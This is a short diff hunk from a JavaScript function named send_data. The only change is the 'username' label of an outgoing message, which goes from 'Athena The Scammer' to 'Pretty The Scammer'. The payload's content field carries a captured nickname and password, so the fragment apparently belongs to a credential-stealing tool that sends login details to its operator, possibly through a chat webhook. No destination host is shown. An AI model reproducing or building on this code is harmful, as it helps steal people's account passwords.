@@ -17,7 +17,7 @@ async function send_data() {
   }
 
   const payload  = {
-    username: "Athena The Scammer",
+    username: "Pretty The Scammer",
     content: `Nickname: ${username}\nPassword: ${password}`
   }
 
